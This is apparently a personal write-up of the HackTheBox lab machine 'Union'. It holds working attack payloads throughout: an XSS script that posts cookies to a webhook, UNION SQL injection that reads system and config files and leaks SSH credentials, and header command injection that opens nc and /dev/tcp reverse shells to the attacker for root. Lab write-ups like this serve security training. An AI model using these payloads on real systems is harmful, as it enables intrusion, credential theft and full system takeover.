# Union

## NMAP
```
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
NO UDP PORTS OPEN
```

## Foothold
- No subdomains or vhosts
- no directories, files - `config.php` not accessible
- tried webhook but its a reflected xss so getting my own value
```
<script>
fetch('https://webhook.site/35a47959-f681-4dd9-b6fd-f92f877cd19b', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

- trying sqlmap on `index.php` player parameter
    - `POST parameter 'player' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable `
    - SQLMap not able to do anything as the server dies instantly
- tried `playername' OR ` - which does not return a link in the response.
- tried UNION/ORDER by injection
    - `playername' ORDER BY 99-- -` did not do anything
    - `playername' UNION SELECT NULL-- -` gives an error - `Sorry, you are not eligible due to already qualifying.` - **new error**
- proceeding with UNION Based sqli
```
> player=playername' UNION SELECT database()-- -
Sorry, november you are not eligible due to already qualifying.

> player=playername' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES where table_schema='november'-- -
Sorry, flag you are not eligible due to already qualifying.

> player=playername' UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS where table_name='flag'-- -
Sorry, one you are not eligible due to already qualifying.

> playername' UNION SELECT one FROM flag-- -
UHC{F1rst_5tep_2_Qualify}
```
- enter the flag in the challenge.php page
    - this will enable ssh access
- now nmap shows port 22 as well

- enumerating further as we dont know the username or pass
    - `playername' UNION SELECT USER()-- -` says `uhc@localhost`
- checking user privileges
    - `playername' UNION SELECT super_priv FROM mysql.user WHERE user='uhc'-- -`
    - `Y` meaning we have good privileges
    - we can list the privileges using:
        `playername' UNION SELECT GROUP_CONCAT(privilege_type SEPARATOR ' | \n') FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
    - this should have `FILE` privs
- reading files
    - `playername' UNION SELECT LOAD_FILE("/etc/passwd")-- -` shows root, mysql, uhc, htb
    - `playername' UNION SELECT LOAD_FILE("/home/uhc/.ssh/id_rsa")-- -` did not work
    - `playername' UNION SELECT LOAD_FILE("/var/www/html/config.php")-- -` accessing the config file we found from directory enumeration
    ```
    <?php
        session_start();
        $servername = "127.0.0.1";
        $username = "uhc";
        $password = "uhc-11qual-global-pw";
        $dbname = "november";

        $conn = new mysqli($servername, $username, $password, $dbname);
    ?>
    ```
- `ssh uhc@10.10.11.128` - `uhc-11qual-global-pw` to get user.txt f1a73742865fbfdbf0af7b85a31c151e

## Privesc
- running linpeas.sh
```
 18:33:38,851 DEBUG root:39 start: subiquity/Identity/POST: {"realname": "htb", "username": "htb", "crypted_password": "$6$jup17Ho9EqIO0i...

/var/log/syslog
/var/log/auth.log

/run/screen

logrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

root         807  0.0  0.4 193132 19368 ?        Ss   13:59   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
www-data     857  0.0  0.3 193604 15288 ?        S    13:59   0:00  _ php-fpm: pool www
www-data     860  0.0  0.3 193604 13876 ?        S    13:59   0:00  _ php-fpm: pool www
daemon[0m       811  0.0  0.0   3792  2420 ?        Ss   13:59   0:00 /usr/sbin/atd -f
root         864  0.0  0.0  55284  1536 ?        Ss   13:59   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
www-data     865  0.0  0.1  56144  6252 ?        S    13:59   0:02  _ nginx: worker process
www-data     866  0.0  0.1  56152  6280 ?        S    13:59   0:02  _ nginx: worker process


```

- checking the firewall.php file we see that it allows `sudo iptables` command.
```
<?php
require('config.php');

if (!($_SESSION['Authenticated'])) {
  echo "Access Denied";
  exit;
}

?>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
                <h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>

        </div>
        <section class="bg-dark text-center p-5 mt-4">
                <div class="container p-5">
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
                </div>
        </section>
</div>
```
- running an nc listener on 8484
- send the firewall.php request to repeater and add:
`X-Forwarded-For: 10.10.14.67 -j ACCEPT; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.67 8484 >/tmp/f;`
- we get a `www-data` shell.
    - running `sudo -l` we get
    ```
    Matching Defaults entries for www-data on union:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on union:
        (ALL : ALL) NOPASSWD: ALL
    ```
    - we can run the sudo commands without password
- start nc on 9494
- in the `www-data` shell run: `sudo /bin/bash -i >& /dev/tcp/10.10.14.67/9494 0>&1`
- get the root shell on nc
    - root flag - 2b9cb007660ff83275a1b8b7d189a0b0
